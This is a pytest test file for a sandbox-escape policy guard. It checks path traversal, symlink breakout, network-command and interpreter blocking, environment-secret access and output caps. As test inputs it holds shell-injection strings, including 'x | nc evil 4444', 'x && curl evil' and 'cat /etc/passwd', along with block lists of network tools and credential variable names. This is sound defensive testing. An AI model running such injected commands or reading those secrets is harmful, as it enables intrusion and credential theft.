"""Tests for tools/sandbox_escape_check.py.

Each test asserts the policy guard refuses a hostile pattern OR allows a
benign one. The harness MUST never execute hostile commands; it only verifies
the guard's classification logic.
"""

from __future__ import annotations

import sys
import tempfile
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
TOOLS = REPO_ROOT / "tools"
sys.path.insert(0, str(TOOLS))

import sandbox_escape_check as sec  # noqa: E402


@pytest.fixture
def policy(tmp_path):
    sandbox_root = tmp_path / "sandbox"
    sandbox_root.mkdir()
    return sec.SandboxPolicy(sandbox_root)


# --- path checks ---


def test_path_inside_sandbox_allowed(policy, tmp_path):
    inside = policy.sandbox_root / "ok.txt"
    decision = policy.check_path(inside)
    assert decision.allowed is True


def test_path_traversal_segment_refused(policy):
    p = policy.sandbox_root / ".." / "outside.txt"
    assert policy.check_path(p).allowed is False


def test_absolute_path_outside_sandbox_refused(policy):
    assert policy.check_path(Path("/etc/passwd")).allowed is False


def test_nested_traversal_refused(policy):
    p = policy.sandbox_root / ".." / ".." / ".." / "etc" / "passwd"
    assert policy.check_path(p).allowed is False


def test_symlink_breakout_refused(policy, tmp_path):
    """A symlink pointing outside the sandbox MUST be refused."""
    outside = tmp_path / "outside" / "secret.txt"
    outside.parent.mkdir(parents=True)
    outside.write_text("classified")
    link = policy.sandbox_root / "escape"
    try:
        link.symlink_to(outside)
    except OSError:
        pytest.skip("environment does not support symlinks")
    assert policy.check_path(link).allowed is False


# --- command checks ---


@pytest.mark.parametrize("cmd", ["curl", "wget", "ssh", "scp", "nc", "ftp"])
def test_forbidden_network_commands_refused(policy, cmd):
    assert policy.check_command([cmd, "https://example.com"]).allowed is False


@pytest.mark.parametrize("cmd", ["/usr/bin/curl", "./curl", "../wget"])
def test_forbidden_network_basename_match(policy, cmd):
    """Basename comparison MUST catch path-prefixed network commands."""
    assert policy.check_command([cmd, "x"]).allowed is False


@pytest.mark.parametrize("cmd", [
    "python", "python3", "bash", "sh", "zsh", "node", "ruby", "perl",
])
def test_recursive_subprocess_refused(policy, cmd):
    assert policy.check_command([cmd, "-c", "echo x"]).allowed is False


def test_allowed_command_passes(policy):
    assert policy.check_command(["echo", "hello"]).allowed is True


def test_unknown_command_refused(policy):
    assert policy.check_command(["mystery_binary"]).allowed is False


def test_empty_command_refused(policy):
    assert policy.check_command([]).allowed is False


@pytest.mark.parametrize("inj", [
    "hello; cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "x | nc evil 4444",
    "x && curl evil",
])
def test_shell_metacharacter_in_arg_refused(policy, inj):
    assert policy.check_command(["echo", inj]).allowed is False


# --- env checks ---


@pytest.mark.parametrize("var", [
    "AWS_SECRET_ACCESS_KEY", "AZURE_CLIENT_SECRET", "GCP_KEY", "GOOGLE_TOKEN",
    "GITHUB_TOKEN", "GH_TOKEN", "NPM_TOKEN", "SSH_AUTH_SOCK",
    "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "SECRET_FOO", "TOKEN_X",
    "PRIVATE_KEY_PATH",
])
def test_forbidden_env_refused(policy, var):
    assert policy.check_env_access(var).allowed is False


@pytest.mark.parametrize("var", ["PATH", "HOME", "USER", "LANG", "TZ"])
def test_benign_env_allowed(policy, var):
    assert policy.check_env_access(var).allowed is True


def test_forbidden_env_case_insensitive(policy):
    assert policy.check_env_access("aws_secret_access_key").allowed is False


# --- output flood ---


def test_output_within_cap_allowed(policy):
    assert policy.check_output_size(1024).allowed is True


def test_output_at_cap_allowed(policy):
    assert policy.check_output_size(policy.max_output_bytes).allowed is True


def test_output_above_cap_refused(policy):
    assert policy.check_output_size(policy.max_output_bytes + 1).allowed is False


def test_output_huge_refused(policy):
    assert policy.check_output_size(10 * 1024 * 1024 * 1024).allowed is False


# --- harness end-to-end ---


def test_run_escape_attempts_all_pass():
    results = sec.run_escape_attempts()
    assert sec.all_passed(results) is True


def test_attempt_categories_covered():
    """Every required hostile category MUST appear in the harness output."""
    results = sec.run_escape_attempts()
    categories = {r.category for r in results}
    required = {
        "symlink_breakout", "path_traversal", "forbidden_env",
        "forbidden_network", "recursive_subprocess", "output_flood",
        "control_allow",
    }
    assert required <= categories, f"missing: {required - categories}"


def test_self_check_returns_zero():
    assert sec.self_check() == 0


def test_cli_check_returns_zero():
    assert sec.main(["check", "--quiet"]) == 0


def test_cli_self_check_returns_zero():
    assert sec.main(["self-check"]) == 0


def test_cli_json_emits_valid_json(capsys):
    rc = sec.main(["check", "--json"])
    captured = capsys.readouterr()
    import json
    payload = json.loads(captured.out)
    assert payload["all_passed"] is True
    assert isinstance(payload["results"], list)
    assert len(payload["results"]) >= 25
    assert rc == 0
